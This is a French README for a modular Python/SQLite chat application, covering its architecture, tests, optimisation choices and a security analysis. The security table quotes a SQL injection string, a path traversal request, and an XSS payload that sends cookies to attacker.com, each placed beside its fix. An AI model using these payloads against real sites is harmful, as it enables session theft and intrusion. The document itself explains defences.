# 💬 Application de Messagerie Chat SQLite avec Interface HTML/CSS

Application complète et modulaire de messagerie instantanée construite en **Python, SQLite, HTML5, CSS3 et JavaScript moderne**.

---

## 📋 Table des matières
1. [Architecture du Projet](#-architecture-du-projet)
2. [Lancement Rapide et Tests](#-lancement-rapide-et-tests)
3. [Implémentation des Fonctions Métier](#-implémentation-des-fonctions-métier)
   - [1. Ajouter un nouvel utilisateur](#1-ajouter-un-nouvel-utilisateur-add_user)
   - [2. Ajouter un message avec création automatique](#2-ajouter-un-message-avec-création-automatique-add_message_to_conversation)
   - [3. Créer une nouvelle conversation](#3-créer-une-nouvelle-conversation-create_conversation)
   - [4. Récupérer les messages d'une conversation](#4-récupérer-les-messages-dune-conversation-get_conversation_messages)
4. [Analyse des Problèmes d'Optimisation (Exigence 5)](#-5-analyse-des-problèmes-doptimisation)
5. [Analyse des Failles et Bonnes Pratiques de Sécurité (Exigence 6)](#-6-analyse-des-failles-et-bonnes-pratiques-de-sécurité)

---

## 🏛 Architecture du Projet

```text
chat_sqlite_app/
├── database.py       # Configuration SQLite, WAL mode, clés étrangères, création des tables et index
├── services.py       # Logique métier : add_user, add_message_to_conversation, create_conversation, get_conversation_messages
├── server.py         # Serveur HTTP REST autonome (sans dépendances externes)
├── run.py            # Point d'entrée pour démarrer l'application
├── static/
│   ├── index.html    # Interface graphique moderne et réactive
│   ├── style.css     # Design sombre et épuré avec bulles de conversation et responsive design
│   └── app.js        # Gestion dynamique du DOM, requêtes API et assainissement XSS
└── tests/
    ├── test_services.py  # Tests unitaires complets des fonctions de service
    └── test_server.py    # Tests d'intégration des routes HTTP et fichiers statiques
```

---

## 🚀 Lancement Rapide et Tests

### 1. Démarrer l'application
Depuis la racine du projet, lancez simplement :
```bash
python run.py
```
Ouvrez ensuite votre navigateur sur : **[http://127.0.0.1:8000](http://127.0.0.1:8000)**

### 2. Exécuter la suite de tests unitaires
Le projet comprend **20 tests unitaires et d'intégration** couvrant l'ensemble des cas nominaux et cas d'erreur :
```bash
python -m pytest chat_sqlite_app/tests -v
```

---

## 🛠 Implémentation des Fonctions Métier

### 1. Ajouter un nouvel utilisateur (`add_user`)
Permet de créer un nouvel utilisateur avec validation des données et vérification d'unicité du pseudo.
- **Requête paramétrée** : `INSERT INTO users (username, email) VALUES (?, ?)`
- **Contrainte d'unicité** : empêche les doublons via `UNIQUE NOT NULL COLLATE NOCASE`.

### 2. Ajouter un message avec création automatique (`add_message_to_conversation`)
Conforme à l'exigence : *« Si la conversation n'existe pas, elle doit être créée automatiquement avant l'ajout du message. »*
- Vérifie si l'expéditeur existe (`sender_id`).
- Recherche la conversation cible. Si elle est absente (`None` ou ID introuvable), une nouvelle conversation est **automatiquement créée** dans la même transaction SQL.
- Insère ensuite le message lié à la conversation créée.

### 3. Créer une nouvelle conversation (`create_conversation`)
Développe un nouveau fil de discussion à partir d'un titre nettoyé et validé.

### 4. Récupérer les messages d'une conversation (`get_conversation_messages`)
Extrait tous les messages ordonnés chronologiquement (`ORDER BY created_at ASC, id ASC`) avec le nom de l'auteur grâce à une jointure `INNER JOIN users`. Supporte la pagination avec `LIMIT` et `OFFSET`.

---

## ⚡ 5. Analyse des Problèmes d'Optimisation

| Problème Identifié | Impact Performance / Ressources | Solution Appliquée |
| :--- | :--- | :--- |
| **Absence d'index B-Tree sur les clés étrangères et dates** | Sur les tables volumineuses, chaque recherche de messages ou tri chronologique entraîne un **Full Table Scan (O(N))**, scannant l'intégralité du disque. | Création d'un index composite :<br>`CREATE INDEX idx_messages_conversation ON messages(conversation_id, created_at);`<br>Réduit la complexité à **O(log N)**. |
| **Problème des Requêtes N+1** | Récupérer d'abord les messages, puis exécuter dans une boucle `SELECT * FROM users WHERE id = ?` pour chaque message génère $N+1$ allers-retours disques. | **Jointure SQL unique** :<br>`SELECT m.*, u.username FROM messages m INNER JOIN users u ON m.sender_id = u.id WHERE m.conversation_id = ?`<br>Un seul aller-retour SQL. |
| **Verrous de Concurrence SQLite (Rollback Journal)** | Par défaut, SQLite utilise un verrou exclusif sur la base lors d'une écriture, bloquant toutes les requêtes de lecture. | Activation du mode **WAL (Write-Ahead Logging)** :<br>`PRAGMA journal_mode = WAL;`<br>Permet aux lecteurs de lire simultanément pendant qu'un rédacteur écrit. |
| **Surcharge Mémoire sur Grands Volumes (Manque de Pagination)** | Charger 50 000 messages en mémoire d'un seul coup sature la RAM du serveur et fait ramer le DOM du navigateur. | Implémentation du support **`LIMIT` / `OFFSET`** (ou Keyset Pagination) pour charger les messages par paquets (ex: 50 par 50). |
| **Surcoût d'I/O à l'ouverture de connexion** | Réouvrir une connexion SQLite sans fermeture propre ou sans gestionnaire de contexte entraîne des fuites de descripteurs de fichiers. | Gestionnaire de contexte sécurisé (`@contextmanager get_db`) avec fermeture automatique et commit/rollback systématique. |

---

## 🔒 6. Analyse des Failles et Bonnes Pratiques de Sécurité

| Faille / Risque | Description de la Vulnérabilité | Solution Appliquée & Bonnes Pratiques |
| :--- | :--- | :--- |
| **Injections SQL (CWE-89)** | Concaténer les variables utilisateurs (ex: `f"INSERT INTO users VALUES ('{username}')"`) permet à un pirate d'injecter du code SQL malveillant (ex: `' OR '1'='1`). | **Requêtes préparées systématiques** : passage des données sous forme de tuples de paramètres `(?, ?)` traités par le moteur SQLite comme de pures valeurs littérales, jamais exécutées. |
| **Cross-Site Scripting (XSS - CWE-79)** | Si un utilisateur injecte `<script>fetch('http://attacker.com?c='+document.cookie)</script>` et que ce message est injecté via `innerHTML`, le script s'exécute chez toutes les personnes lisant le chat. | **Assainissement strict et encodage HTML** : utilisation de `element.textContent` dans le JavaScript client et fonction `escapeHtml()` pour neutraliser les balises et entités sensibles (`<`, `>`, `&`, `"`, `'`). |
| **Clés Étrangères Désactivées (Orphelins)** | Par défaut, SQLite **désactive** la vérification des clés étrangères. Un message peut donc pointer vers un expéditeur inexistant ou un salon supprimé. | Activation explicite à chaque connexion :<br>`PRAGMA foreign_keys = ON;`<br>Garantit l'intégrité référentielle et les cascades de suppression (`ON DELETE CASCADE`). |
| **Déni de Service (DoS) par Charge Utile** | Envoi de messages de plusieurs gigaoctets ou chaînes vides polluant la base. | **Validation stricte en amont** : contrôle de longueur maximale (5000 caractères), rejet des chaînes blanches ou vides. |
| **Path Traversal sur Fichiers Statiques (CWE-22)** | Une requête HTTP vers `/static/../../windows/system.ini` pourrait exposer des fichiers confidentiels du serveur. | Vérification stricte du chemin canonique résolu (`os.path.realpath`) garantissant que la ressource reste confinée dans le dossier `static/`. |
| **Authentification & Stockage des Identifiants** | Pour une mise en production avec mot de passe, stocker les mots de passe en clair ou en MD5/SHA1 est une grave faille. | Recommandation : hachage salé adaptatif avec **Argon2id** ou **bcrypt**, couplé à une authentification par jetons sécurisés (JWT HttpOnly). |
